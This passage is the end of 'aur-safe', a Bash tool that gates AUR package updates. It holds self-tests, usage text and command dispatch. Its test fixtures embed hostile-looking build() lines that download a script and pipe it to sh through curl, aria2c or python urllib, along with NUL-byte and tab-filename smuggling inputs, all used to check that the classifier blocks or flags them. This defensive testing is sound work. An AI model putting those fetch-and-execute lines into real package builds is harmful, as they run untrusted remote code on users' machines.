  fi

  # Attacker-controlled attributes or NUL content must not make a textual patch
  # opaque/corrupt while leaving a consentable review. Both fail closed.
  _class_bld "$_clx" cls-opaque-patch "$_old_basic" "$_old_basic" "$_old_src" "$_old_src"
  printf '*.patch binary\n' >"$_CLASS_DIR/.gitattributes"
  printf 'hidden patch text\n' >"$_CLASS_DIR/payload.patch"
  git -C "$_CLASS_DIR" add .gitattributes payload.patch
  git -C "$_CLASS_DIR" -c user.email=t@t -c user.name=t commit -qm opaque-patch
  git -C "$_CLASS_DIR" update-ref refs/remotes/origin/master HEAD
  scan_diff_rules cls-opaque-patch "$_CLASS_DIR" "$_CLASS_BASE" >/dev/null 2>&1
  _patch_rc=$?
  if [ "$_patch_rc" -eq 1 ]; then
    log "  $(c_green "PASS") review-opaque-patch-blocks"; pass=$((pass+1))
  else
    log "  $(c_red "FAIL") review-opaque-patch-blocks (rc $_patch_rc)"; fail=$((fail+1))
  fi

  _class_bld "$_clx" cls-nul-patch "$_old_basic" "$_old_basic" "$_old_src" "$_old_src"
  printf '*.patch text\n' >"$_CLASS_DIR/.gitattributes"
  printf 'visible\000hidden\n' >"$_CLASS_DIR/payload.patch"
  git -C "$_CLASS_DIR" add .gitattributes payload.patch
  git -C "$_CLASS_DIR" -c user.email=t@t -c user.name=t commit -qm nul-patch
  git -C "$_CLASS_DIR" update-ref refs/remotes/origin/master HEAD
  scan_diff_rules cls-nul-patch "$_CLASS_DIR" "$_CLASS_BASE" >/dev/null 2>&1
  _patch_rc=$?
  if [ "$_patch_rc" -eq 1 ]; then
    log "  $(c_green "PASS") review-nul-evidence-blocks"; pass=$((pass+1))
  else
    log "  $(c_red "FAIL") review-nul-evidence-blocks (rc $_patch_rc)"; fail=$((fail+1))
  fi

  # A NUL in PKGBUILD used to make git emit only "Binary files differ";
  # `diff_added` then looked empty and the gate returned boring. Reject the blob
  # before it enters a Bash scalar, and make the result non-consentable.
  _class_bld "$_clx" cls-nul-pkgbuild "$_old_basic" "$_new_basic" "$_old_src" "$_new_src"
  printf '\000printf NUL_MARKER >&2\n' >>"$_CLASS_DIR/PKGBUILD"
  git -C "$_CLASS_DIR" add PKGBUILD
  git -C "$_CLASS_DIR" -c user.email=t@t -c user.name=t commit -qm nul-pkgbuild
  git -C "$_CLASS_DIR" update-ref refs/remotes/origin/master HEAD
  classify_diff_rules cls-nul-pkgbuild "$_CLASS_DIR" "$_CLASS_BASE" >/dev/null 2>&1
  _patch_rc=0
  scan_diff_rules cls-nul-pkgbuild "$_CLASS_DIR" "$_CLASS_BASE" >/dev/null 2>&1 || _patch_rc=$?
  if [ "$SCAN_DIFF_CLASS" = audit_unavailable ] && [ "$_patch_rc" -eq 1 ]; then
    log "  $(c_green "PASS") classifier-nul-pkgbuild-blocks"; pass=$((pass+1))
  else
    log "  $(c_red "FAIL") classifier-nul-pkgbuild-blocks (class $SCAN_DIFF_CLASS, rc $_patch_rc)"; fail=$((fail+1))
  fi

  # NUL-delimited structural parsing: an attacker-controlled tab in a filename
  # must still register as an added file, never split or disappear.
  _class_bld "$_clx" cls-tab-filename "$_old_basic" "$_old_basic" "$_old_src" "$_old_src"
  printf 'payload\n' >"$_CLASS_DIR/odd"$'\t'"name.install"
  git -C "$_CLASS_DIR" add -A
  git -C "$_CLASS_DIR" -c user.email=t@t -c user.name=t commit -qm tab-file
  git -C "$_CLASS_DIR" update-ref refs/remotes/origin/master HEAD
  classify_diff_rules cls-tab-filename "$_CLASS_DIR" "$_CLASS_BASE" >/dev/null 2>&1
  if [ "$SCAN_DIFF_CLASS" = hard ]; then
    log "  $(c_green "PASS") classifier-tab-install-hard"; pass=$((pass+1))
  else
    log "  $(c_red "FAIL") classifier-tab-install-hard (got $SCAN_DIFF_CLASS)"; fail=$((fail+1))
  fi

  # PKGBUILD advisory-metadata array literal: license=('MIT') → license=('MIT'
  # 'LGPL-2.0-or-later'), the kilo-bin shape. Before Fix 1 this array form had
  # no boring branch (only the .SRCINFO space-delimited form at line ~348 did)
  # and fell through to review. Now symmetric with the .SRCINFO form. Everything
  # else in the diff (pkgver, source, sums) is independently boring.
  local _adv_old_pkg _adv_new_pkg
  printf -v _adv_old_pkg 'pkgname=cls-pkg\npkgver=1.0\npkgrel=1\narch=(x86_64)\nlicense=(MIT)\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)' "$_sum1"
  printf -v _adv_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\narch=(x86_64 aarch64)\nlicense=(MIT LGPL-2.0-or-later)\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)' "$_sum1"
  tc_class pkgbuild-license-array-boring boring 0 \
    "$_adv_old_pkg" "$_adv_new_pkg" "$_old_src" "$_new_src"

  # arch/groups/noextract array-literal forms are the same inert-metadata class
  # as license (Fix 1's wider advisory-group scope). groups=(cls-virtual) added
  # and noextract=(pkg-1.tar) added alongside an arch= expansion. optdepends is
  # deliberately exercised by its own stricter handler, not this loose match.
  local _adv2_old_pkg _adv2_new_pkg
  printf -v _adv2_old_pkg 'pkgname=cls-pkg\npkgver=1.0\npkgrel=1\narch=(x86_64)\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)' "$_sum1"
  printf -v _adv2_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\narch=(x86_64 aarch64)\ngroups=(cls-virtual)\nnoextract=(pkg-1.tar)\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)' "$_sum1"
  tc_class pkgbuild-advisory-arrays-boring boring 0 \
    "$_adv2_old_pkg" "$_adv2_new_pkg" "$_old_src" "$_new_src"

  # Regression for the kilo-bin shape WITH the install body: license=() now
  # boring, but a new install line inside package() is non-boring → review.
  # This is the case that motivated the fix: the gate MUST still block, and
  # the reported detail should point at the install, not the license. Fix 1
  # alone reclassifies the license; the detail-selection (Fix 2) is exercised
  # by the inline assertion below.
  local _kilo_old_pkg _kilo_new_pkg
  printf -v _kilo_old_pkg 'pkgname=cls-pkg\npkgver=1.0\npkgrel=1\narch=(x86_64)\nlicense=(MIT)\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\npackage() {\n  install -Dm755 ./x "${pkgdir}/usr/bin/x"\n}' "$_sum1"
  printf -v _kilo_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\narch=(x86_64)\nlicense=(MIT LGPL-2.0-or-later)\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\npackage() {\n  install -Dm755 ./x "${pkgdir}/usr/bin/x"\n  install -Dm755 ./bwrap "${pkgdir}/usr/lib/cls/bwrap"\n}' "$_sum1"
  tc_class pkgbuild-package-body-review review 2 \
    "$_kilo_old_pkg" "$_kilo_new_pkg" "$_old_src" "$_new_src"

  # Alternative fetchers (aria2c, socat, nc, tftp, rsync, python urllib) are
  # intentionally NOT name-blacklisted. The fail-closed classifier sends these
  # added shell statements to review, not clean. These tests pin that behavior.
  local _aria_new_pkg _pyurl_new_pkg _ansic_new_pkg _gh6_evasion_pkg
  printf -v _aria_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\nbuild() {\n  aria2c https://x.sh | sh\n}' "$_sum1"
  printf -v _pyurl_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\nbuild() {\n  python3 -c "import urllib.request; urllib.request.urlretrieve('"'"'https://x.sh'"'"', '"'"'/tmp/x.sh'"'"')"\n  sh /tmp/x.sh\n}' "$_sum1"
  printf -v _ansic_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=($'"'"'https://example.com/pkg-1.tar'"'"')\nsha256sums=(%s)' "$_sum1"
  tc_class alt-downloader-aria2c-review review 2 \
    "$_old_basic" "$_aria_new_pkg" "$_old_src" "$_new_src"
  tc_class alt-downloader-python-urllib-review review 2 \
    "$_old_basic" "$_pyurl_new_pkg" "$_old_src" "$_new_src"
  tc_class ansic-quote-source-array-review review 2 \
    "$_old_basic" "$_ansic_new_pkg" "$_old_src" "$_new_src"

  # Finding gh6: hard rules are brittle (quoted command names, absolute
  # interpreter paths, alternate subcommands). These shapes do not match the
  # regex rules; the fail-closed structural classifier still routes them to review.
  printf -v _gh6_evasion_pkg $'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\nbuild() {\n  n""pm install evil\n  \'n\'pm install evil\n  curl -s http://x | /bin/sh\n  git submodule update --init\n}' "$_sum1"
  tc_class gh6-hard-rule-evasions-review review 2 \
    "$_old_basic" "$_gh6_evasion_pkg" "$_old_src" "$_new_src"

  # Inline assertion: the review detail now points at the build-logic line
  # (install -Dm755 ./bwrap), not the earlier license=() line, and the summary
  # is "package build instructions changed". First test to assert on the
  # review detail/summary stderr; modeled on the _aur_rpc_info capture pattern.
  # Exercises both Fix 2a (content-based build-logic detection — no git hunk
  # annotation exists for PKGBUILD) and Fix 2b (two-pass detail selection).
  _class_bld "$_clx" "cls-kilo-detail" "$_kilo_old_pkg" "$_kilo_new_pkg" "$_old_src" "$_new_src"
  local _detail_out
  LLM_AUTO_BORING=0
  _detail_out=$(classify_diff_rules "cls-kilo-detail" "$_CLASS_DIR" "$_CLASS_BASE" 2>&1 >/dev/null)
  if printf '%s\n' "$_detail_out" | grep -q 'package build instructions changed' \
     && printf '%s\n' "$_detail_out" | grep -q 'install -Dm755 ./bwrap' \
     && ! printf '%s\n' "$_detail_out" | grep -q "added: PKGBUILD.*license="; then
    log "  $(c_green "PASS") classifier-detail-prefers-build-logic"; pass=$((pass+1))
  else
    log "  $(c_red "FAIL") classifier-detail-prefers-build-logic (got: $_detail_out)"
    fail=$((fail+1))
  fi

  # Regression for the colon-in-text extraction bug a delegate review caught:
  # the old _detail_is_build_logic parsed the added text out of the formatted
  # detail with ${detail##*: }, which truncated at the LAST ": " — so a
  # build-logic line whose text contains ": " lost its leading keyword and
  # silently fell through to the generic summary. The fixture's build() body
  # contains `make "target: release"` (the ": " exercises the extraction path);
  # the assertion only needs the build-logic SUMMARY to fire, proving the raw-
  # text path works. (The chosen detail points at `build() {`, which is also
  # valid build-logic and appears earlier in diff order — also fine.)
  local _colon_old_pkg _colon_new_pkg _colon_out
  printf -v _colon_old_pkg 'pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)' "$_sum1"
  printf -v _colon_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\nbuild() {\n  make "target: release"\n}' "$_sum1"
  _class_bld "$_clx" "cls-colon-text" "$_colon_old_pkg" "$_colon_new_pkg" "$_old_src" "$_new_src"
  LLM_AUTO_BORING=0
  _colon_out=$(classify_diff_rules "cls-colon-text" "$_CLASS_DIR" "$_CLASS_BASE" 2>&1 >/dev/null)
  if printf '%s\n' "$_colon_out" | grep -q 'package build instructions changed'; then
    log "  $(c_green "PASS") classifier-detail-build-logic-colon-in-text"; pass=$((pass+1))
  else
    log "  $(c_red "FAIL") classifier-detail-build-logic-colon-in-text (got: $_colon_out)"
    fail=$((fail+1))
  fi

  # Regression for gh19: raw added-line text may contain a literal tab. Keep
  # package() in the baseline so the tab-bearing command is the only added
  # build-logic candidate, then require the complete rendered detail. Under the
  # old tab-separated record reader, the interior tab after `install -D` split
  # d_text early and made d_fmt begin with `-m755 ...` instead of `PKGBUILD:`.
  local _tab_old_pkg _tab_new_pkg _tab_out _tab_expected
  printf -v _tab_old_pkg 'pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\npackage() {\n  install -Dm755 ./existing "${pkgdir}/usr/bin/existing"\n}' "$_sum1"
  printf -v _tab_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\npackage() {\n  install -Dm755 ./existing "${pkgdir}/usr/bin/existing"\n  install -D\t-m755 ./tabbed "${pkgdir}/usr/bin/tabbed"\n}' "$_sum1"
  _class_bld "$_clx" "cls-tab-text" "$_tab_old_pkg" "$_tab_new_pkg" "$_old_src" "$_new_src"
  LLM_AUTO_BORING=0
  _tab_out=$(classify_diff_rules "cls-tab-text" "$_CLASS_DIR" "$_CLASS_BASE" 2>&1 >/dev/null)
  _tab_expected=$'      added: PKGBUILD:8:   install -D\t-m755 ./tabbed "${pkgdir}/usr/bin/tabbed"'
  if printf '%s\n' "$_tab_out" | grep -q 'package build instructions changed' \
     && printf '%s\n' "$_tab_out" | grep -Fqx "$_tab_expected"; then
    log "  $(c_green "PASS") classifier-detail-tab-in-text"; pass=$((pass+1))
  else
    log "  $(c_red "FAIL") classifier-detail-tab-in-text (got: $_tab_out)"
    fail=$((fail+1))
  fi

  # Git can label a PKGBUILD hunk containing `_build=...` with a preceding
  # `depends=(...)` assignment. Rendering that heuristic heading as "in
  # depends" made an ordinary release identifier look like a dependency-array
  # mutation. Keep the useful file:line location, identify the numeric variable
  # explicitly, and omit the false scope.
  local _var_old_pkg _var_new_pkg _var_out _var_expected
  printf -v _var_old_pkg 'pkgname=cls-pkg\npkgver=1.0\npkgrel=1\ndepends=(alsa-lib\n  gtk3)\nsource=("https://example.com/pkg-$pkgver.tar")\nsha256sums=(%s)\n_build=5358163105546240' "$_sum1"
  _var_new_pkg=${_var_old_pkg/5358163105546240/4510119262814208}
  _class_bld "$_clx" "cls-numeric-variable-detail" "$_var_old_pkg" "$_var_new_pkg" "$_old_src" "$_old_src"
  LLM_AUTO_BORING=0
  _var_out=$(classify_diff_rules "cls-numeric-variable-detail" "$_CLASS_DIR" "$_CLASS_BASE" 2>&1 >/dev/null)
  _var_expected="      added: PKGBUILD:8: _build=4510119262814208"
  if printf '%s\n' "$_var_out" | grep -Fq "PKGBUILD variable '_build' changed; numeric value needs review" \
     && printf '%s\n' "$_var_out" | grep -Fqx "$_var_expected" \
     && ! printf '%s\n' "$_var_out" | grep -Fq ' in depends='; then
    log "  $(c_green "PASS") classifier-detail-numeric-variable-no-false-scope"; pass=$((pass+1))
  else
    log "  $(c_red "FAIL") classifier-detail-numeric-variable-no-false-scope (got: $_var_out)"
    fail=$((fail+1))
  fi

  classify_diff_rules bad-ref "$_edge_dir" "0000000000000000000000000000000000000000" >/dev/null 2>&1
  local _bad_class="$SCAN_DIFF_CLASS" _bad_rc
  _LLM_TEST_CALLS=0
  scan_diff_rules bad-ref "$_edge_dir" "0000000000000000000000000000000000000000" >/dev/null 2>&1
  _bad_rc=$?
  if [ "$_bad_class" = audit_unavailable ] && [ "$_bad_rc" -eq 1 ] && [ "$_LLM_TEST_CALLS" -eq 0 ]; then
    log "  $(c_green "PASS") classifier-audit-unavailable-no-llm"; pass=$((pass+1))
  else
    log "  $(c_red "FAIL") classifier-audit-unavailable-no-llm"
    fail=$((fail+1))
  fi

  # shellcheck disable=SC2329  # test seam, called indirectly by llm_check_boring_edge
  _llm_boring_backend() {
    local n=0
    if [[ -r "$_LLM_TEST_COUNT_FILE" ]]; then
      read -r n <"$_LLM_TEST_COUNT_FILE"
    fi
    printf '%s\n' "$((n + 1))" >"$_LLM_TEST_COUNT_FILE"
    case "$_LLM_TEST_MODE" in
      ok) printf 'VERDICT: BORING_EDGE_OK\nREASON: test seam\n' ;;
      needs) printf 'VERDICT: NEEDS_HUMAN\n' ;;
      malformed) printf 'BORING\n' ;;
      fail) return 1 ;;
      missing) return 127 ;;
    esac
  }

  tl() { # tl name enabled mode expect-rc expect-calls
    local name="$1" enabled="$2" mode="$3" expect_rc="$4" expect_calls="$5" got_rc got_calls
    LLM_AUTO_BORING="$enabled"; _LLM_TEST_MODE="$mode"; _LLM_TEST_COUNT_FILE="$_cls_state/llm-count"
    printf '0\n' >"$_LLM_TEST_COUNT_FILE"
    scan_diff_rules "$_edge_pkg" "$_edge_dir" "$_edge_base" >/dev/null 2>&1
    got_rc=$?
    read -r got_calls <"$_LLM_TEST_COUNT_FILE"
    if [ "$got_rc" -eq "$expect_rc" ] && [ "$got_calls" -eq "$expect_calls" ]; then
      log "  $(c_green "PASS") llm-$name"; pass=$((pass+1))
    else
      log "  $(c_red "FAIL") llm-$name (expected rc $expect_rc/calls $expect_calls, got rc $got_rc/calls $got_calls)"
      fail=$((fail+1))
    fi
  }
  tl disabled-not-invoked 0 ok 2 0
  tl exact-ok-auto-passes 1 ok 0 1
  tl needs-human-reviews 1 needs 2 1
  tl malformed-reviews 1 malformed 2 1
  tl command-failure-reviews 1 fail 2 1
  tl missing-pi-reviews 1 missing 2 1

  printf '%s\t%s\t%s\n' "$_edge_base" "1970-01-01T00:00:00Z" "file://$_edge_dir" >"$ACCEPTED_DIR/$_edge_pkg"
  _AUR_TEST_DIR="$_edge_dir"; AUR_SAFE_STAGING=1
  LLM_AUTO_BORING=1; _LLM_TEST_MODE=ok; _LLM_TEST_CALLS=0
  ta "llm-auto-green-check-stages-tip" 0 check_pkg "$_edge_pkg"
  if [ -f "$STAGED_DIR/$_edge_pkg" ] && [ "$(awk -F '\t' '{print $1}' "$STAGED_DIR/$_edge_pkg")" = "$_edge_tip" ]; then
    log "  $(c_green "PASS") llm-auto-green-staged-sha"; pass=$((pass+1))
  else log "  $(c_red "FAIL") llm-auto-green-staged-sha"; fail=$((fail+1)); fi
  AUR_SAFE_STAGING=""; _AUR_TEST_DIR=""

  unset -f _class_bld tc_class tl _llm_boring_backend
  LLM_AUTO_BORING="$_cls_old_llm"
  STATE_DIR="$_cls_sd"; ACCEPTED_DIR="$_cls_ad"; STAGED_DIR="$_cls_st"; MANIFEST_FILE="$_cls_mf"
  rm -rf "$_clx" "$_cls_state"

  _AUR_TEST_Q=""
  unset -f _bl_bld

  AUR_SAFE_STAGING=""
  AUR_URL="$_osr"; STATE_DIR="$_osd2"; STAGED_DIR="$_ost2"; MANIFEST_FILE="$_omf2"
  rm -rf "$_fbx" "$_fsd"

  # --- exact pre-makepkg SHA guard (Finding S) -----------------------------
  log ""
  log "  $(c_dim "-- makepkg exact-SHA guard --")"
  local _mg_root _mg_repo _mg_state _mg_sha _mg_marker
  local _mg_sd="$STATE_DIR" _mg_ad="$ACCEPTED_DIR" _mg_st="$STAGED_DIR" _mg_mf="$MANIFEST_FILE"
  _mg_root=$(mktemp -d); _mg_repo="$_mg_root/guard-pkg"; _mg_state="$_mg_root/state"
  mkdir -p "$_mg_repo" "$_mg_state/accepted" "$_mg_state/staged"
  ( cd "$_mg_repo" || exit 1
    git -c init.defaultBranch=master init -q
    git config user.email t@t; git config user.name t
    printf 'pkgname=guard-pkg\npkgver=1\npkgrel=1\n' >PKGBUILD
    printf 'pkgbase = guard-pkg\n\tpkgver = 1\n\tpkgrel = 1\n\npkgname = guard-pkg\n' >.SRCINFO
    git add -A; git commit -qm base )
  _mg_sha=$(git -C "$_mg_repo" rev-parse HEAD); _mg_marker="$_mg_root/makepkg-called"
  STATE_DIR="$_mg_state"; ACCEPTED_DIR="$_mg_state/accepted"; STAGED_DIR="$_mg_state/staged"; MANIFEST_FILE="$_mg_state/last-gate"
  _atomic_write_record "$STAGED_DIR/guard-pkg" "$_mg_sha"$'\t'"1970-01-01T00:00:00Z"$'\t'"file://$_mg_repo"
  printf 'guard-pkg\n' >"$MANIFEST_FILE"
  # shellcheck disable=SC2329  # test seam, invoked indirectly by cmd_makepkg
  _exec_real_makepkg() { printf '%s\n' "$*" >"$_mg_marker"; return 0; }
  # shellcheck disable=SC2329  # test helpers, invoked through ta
  _mg_run() { ( cd "$_mg_repo" && AUR_SAFE_AS_MAKEPKG=1 AUR_SAFE_TRANSACTION_ACTIVE=1 cmd_makepkg "$@" ); }
  # shellcheck disable=SC2329
  _mg_no_tx() { ( cd "$_mg_repo" && AUR_SAFE_AS_MAKEPKG=1 AUR_SAFE_TRANSACTION_ACTIVE=0 cmd_makepkg "$@" ); }
  ta "makepkg-guard-no-transaction-blocks" 1 _mg_no_tx
  ta "makepkg-guard-repackage-blocks" 1 _mg_run --repackage
  ta "makepkg-guard-context-switch-blocks" 1 _mg_run --dir /tmp
  ta "makepkg-guard-matching-sha-runs" 0 _mg_run --syncdeps --noconfirm
  if grep -q -- '--cleanbuild --force --syncdeps --noconfirm' "$_mg_marker" 2>/dev/null; then
    log "  $(c_green "PASS") makepkg-guard-forces-fresh-artifact-and-preserves-args"; pass=$((pass+1))
  else log "  $(c_red "FAIL") makepkg-guard-forces-fresh-artifact-and-preserves-args"; fail=$((fail+1)); fi

  printf '# changed\n' >>"$_mg_repo/PKGBUILD"
  ta "makepkg-guard-dirty-tracked-blocks" 1 _mg_run
  git -C "$_mg_repo" checkout -q -- PKGBUILD
  printf 'payload\n' >"$_mg_repo/evil.install"
  ta "makepkg-guard-untracked-script-blocks" 1 _mg_run
  rm -f "$_mg_repo/evil.install"
  # Source tarballs are legitimate untracked artifacts in a clone dir; the guard
  # only rejects untracked executable/script files (PKGBUILD/.SRCINFO/*.install/*.sh).
  # Pin that a stale tarball does not block a guarded build.
  touch "$_mg_repo/foo-1.0.tar.gz"
  ta "makepkg-guard-untracked-tarball-allowed" 0 _mg_run
  rm -f "$_mg_repo/foo-1.0.tar.gz"
  : >"$MANIFEST_FILE"
  ta "makepkg-guard-unstaged-dependency-blocks" 1 _mg_run
  printf 'guard-pkg\n' >"$MANIFEST_FILE"
  printf 'pkgname=guard-pkg\npkgver=2\npkgrel=1\n' >"$_mg_repo/PKGBUILD"
  git -C "$_mg_repo" add PKGBUILD; git -C "$_mg_repo" commit -qm newer
  ta "makepkg-guard-window-commit-blocks" 1 _mg_run

  unset -f _mg_run _mg_no_tx
  STATE_DIR="$_mg_sd"; ACCEPTED_DIR="$_mg_ad"; STAGED_DIR="$_mg_st"; MANIFEST_FILE="$_mg_mf"
  rm -rf "$_mg_root"

  log ""
  log "  $(c_bold "$pass passed, $fail failed")"
  exit $fail
}

usage() {
  cat <<EOF
aur-safe — deterministic gate for AUR updates

usage:
  aur-safe gate                gate all pending AUR updates
  aur-safe check <pkg> ...     gate specific cached package(s)
  aur-safe audit <pkg>         gate an uncached/new package (0=clean/consented, 1=block, 2=review)
  aur-safe scan                scan installed pkgs for payload patterns
  aur-safe explain [pkg]       LLM second-opinion on last flagged diff
  aur-safe accept              promote staged refs (called by the wrapper)
  aur-safe rules               list active rules
  aur-safe wrapper             print the suggested shell wrapper (not installed)
  aur-safe selftest            run built-in rule tests

env:
  AUR_SAFE_YAY_CACHE          yay cache dir     (default: ~/.cache/yay)
  AUR_SAFE_PARU_CACHE         paru cache dir    (default: ~/.cache/paru/clone)
  AUR_SAFE_STATE_DIR          state dir         (default: ~/.cache/aur-safe)
  AUR_SAFE_MODEL              explain model     (default: zai/glm-5.2)
  AUR_SAFE_EXPLAIN_MAXLINES   diff truncation   (default: 1000)
  AUR_SAFE_BRANCH             remote branch     (default: master)
  AUR_SAFE_AUR_URL            AUR base URL      (default: https://aur.archlinux.org)
  AUR_SAFE_CONFIG             config file       (default: ~/.config/aur-safe/config)
  AUR_SAFE_LLM_AUTO_BORING    1 enables strict LLM verifier for boring-edge diffs

notes:
  The generated wrapper (aur-safe wrapper) is required for the full build-time
  TOCTOU guarantee. Direct "gate"/"check" + manual helper usage only provides
  version-based accept confirmation; a same-version/different-commit helper fetch
  can execute build-time payload before the next gate surfaces the delta.
EOF
}

###############################################################################
# dispatch
###############################################################################
if [[ "${AUR_SAFE_AS_MAKEPKG:-}" == 1 ]]; then
  cmd_makepkg "$@"
  exit $?
fi
[[ $# -eq 0 ]] && { usage; exit 3; }
case "$1" in
  gate)     shift; cmd_gate "$@" ;;
  check)    shift; cmd_check "$@" ;;
  audit)    shift; cmd_audit "$@" ;;
  scan)     shift; cmd_scan "$@" ;;
  explain)  shift; cmd_explain "$@" ;;
  accept)   shift; cmd_accept "$@" ;;
  rules)    shift; cmd_rules "$@" ;;
  wrapper)  shift; cmd_wrapper "$@" ;;
  selftest) shift; cmd_selftest "$@" ;;
  -h|--help|help) usage ;;
  *) die "unknown command '$1' (try: aur-safe --help)" ;;
esac
